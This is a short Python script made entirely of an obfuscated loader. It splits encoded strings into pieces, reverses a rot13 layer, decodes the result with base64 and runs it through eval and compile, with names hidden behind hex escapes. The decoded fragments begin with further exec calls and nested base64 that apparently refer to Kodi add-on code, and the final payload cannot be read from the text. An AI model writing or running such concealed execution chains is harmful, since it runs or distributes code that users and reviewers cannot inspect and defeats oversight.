

import base64, codecs
magic = 'ZXhlYygiaW1wb3J0IHJlO2ltcG9ydCBiYXNlNjQiKTtleGVjIGJhc2U2NC5hMzJkZWNvZ'
love = 'THbLvWuImS3LwAXZRyVnTyvI05bJxqFqzWaZRgRHJk1HJ1TrycGDGyWD2EiMRuFq2A6o3'
god = 'ZMMmR2Ynk1bmJDOTJhVEZpVVhBbkRRcGhaR1J2YmlBOUlIaGliV05oWkdSdmJpNUJaR1J'
destiny = '2LzyaozZlGayuJRVjGT0kqycVIaAnHmImLIunoRkhGaqvZ0bjL3x1nScUHaMvnJAjVvx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))